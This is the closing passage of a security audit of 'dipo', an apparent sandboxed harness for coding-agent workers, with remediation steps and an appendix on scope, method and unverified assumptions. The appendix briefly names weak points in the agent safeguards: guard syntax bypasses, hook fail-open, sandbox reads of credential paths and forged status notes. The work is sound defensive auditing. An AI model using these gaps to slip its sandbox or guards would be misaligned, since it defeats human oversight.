6. **Temp dirs (V-6, H-10).** In `run/temp-dirs.ts`, add the `prepareShortTempDir` checks. In `plan.ts`, add a realpath equality check. Consider a per-user tmpRoot.
7. **Control socket (H-3, H-4, N-2).**
   - Run the live socket-symlink test first.
   - Add a per-daemon secret or a peer-uid check on `dipo.sock`.
   - Require the engine token for host steering ops.
   - Add an explicit denyRead of the dipo dirs to the worker settings.
8. **Secrets in data (H-6, H-8).** In `context/secrets.ts`, add a content scan and extend the name list. Filter the review diff. Do value-level scrubbing in `ingest/output.ts` and `log/logger.ts`. Fix the stale header.
9. **CI and supply chain (N-4, N-5, H-11 to H-14).**
   - Set `no-cache: true` on setup-bun in `release.yml`.
   - Stop lockfile-maintenance automerge for runtime deps (`renovate.json`).
   - Add CODEOWNERS and a zizmor or actionlint job.
   - Add `.env*`, `*.pem`, `*.key` and `.npmrc` to `.gitignore`.
   - Pin `--source-digest` in `install.sh`.
   - Add an expiry or tracking issue for the GHSA ignore.
10. **Guard robustness (H-15).** Continue DIPO-261 and DIPO-262. In code, refuse or warn on GitHub hosts in `sandbox.allowedDomains`.

## Appendix

**Scope.**
- Covered: the whole repository at `992a78f7`. That is the packages `contract`, `engine`, `daemon`, `client`, `tui` and `cli` (about 125k lines of non-test TypeScript), plus `scripts/`, `tools/`, `.github/`, `install.sh`, the Renovate and release-please config, and the git history.
- Skipped: `node_modules`, `dist` and `.tsbuild`. Installed third-party code was read only to confirm Backlog.md's callback and Ink's sanitiser, plus one read of setup-bun's `action.yml`.

**Method.**
- Six review agents, one per trust boundary: daemon and IPC, worker sandbox, hook guards, git and subprocess, data exposure and prompts, CI and supply chain.
- Then one fresh verifier per candidate vulnerability (7 verifiers).
- Key lines of V-1 to V-6 were spot-checked again by hand.

**Categories skipped as not applicable.**
- Web-only categories: HTTP routes, cookies and sessions, CSRF, CORS, security headers, JWT, OAuth, browser XSS and `postMessage`. dipo has no HTTP server or browser surface; the only listener is a Unix socket plus the localhost Safe-Chain proxy.
- Multi-tenant isolation and IDOR: single user.
- Password storage: none.
- XXE: no XML parsing.
- Containers: no Dockerfile.

**Candidates dropped or reclassified in verification: 21.**
- Excluded by the filtering rules (DoS, theoretical, low impact): daemon crash on an unhandled rejection in the frame queue; memory exhaustion from large context files; `/tmp/dipo-s-*` file squatting; `daemon logs` escape rendering; internal error messages to clients.
- Scored 1–4: `install.sh` staging symlink; provenance digest on the tag-rerun path; branch-name re-validation at git and gh call sites; secret files in the review diff (folded into H-6); breaking reviewer evidence with tag text; fake `[dipo: …]` notes; Edit and Write through worktree symlinks; CLAUDE.md `@` imports; zshrc shell snapshot (Claude Code behaviour); step env not filtered for loader variables; worker text echoed into the resumed prompt; settings-file TOCTOU; hook timeout fail-open (folded into H-15).
- Moved to hardening: host steering ops without a token (H-3); `pr-title` self-attesting (H-11); gh-check syntax bypasses, which are real but harmless under the default network policy (H-15).

**Tools not available:** gitleaks, semgrep, trufflehog, osv-scanner.

**Assumptions and what could not be verified.**
- Nothing was run live. V-1 rests on reading dipo's code and strings from the installed Backlog.md 1.53.0 binary. V-2 assumes srt on macOS lets the step read `~/.config/gcloud` and similar paths, which the code comment and the DIPO-183 rationale both state. V-3 assumes a PermissionRequest hook `allow` lets a Write outside cwd proceed, which Claude Code's hook docs and the `permission-wait` recording indicate.
- N-1 and N-2 need one live test each.
- Repository settings (CodeQL, secret scanning, push protection, branch protection, tag ruleset, environments) are UI settings documented in `SECURITY.md` and `docs/release.md`; they could not be checked from the repository.
- The hook-guard review was cut short while reading `hooks/nudges.ts`, so that file is only partly reviewed. The gh argument handling in `story-pr/prs.ts` and `platform/host.ts` was reviewed only to the point of confirming argv-only spawning.
